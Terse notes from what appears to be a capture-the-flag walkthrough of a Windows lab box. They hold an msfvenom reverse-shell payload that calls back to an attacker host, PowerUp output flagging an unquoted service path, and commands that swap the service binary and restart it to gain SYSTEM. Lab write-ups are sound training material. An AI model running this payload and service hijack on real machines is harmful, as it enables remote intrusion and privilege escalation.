# steel mountan

windows box, mr robot themed

msfvenom -p windows/shell_reverse_tcp LHOST=10.13.2.66 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe


erviceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

"C:\Program Files (x86)\IObit\AdvancedSystemCare\ASCService.exe"


Copy-Item "C:\Users\bill\Desktop\Advanced.exe" -Destination "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"

sc stop AdvancedSystemCareService9

sc start AdvancedSystemCareService9


C:/Program\ Files\ (x86)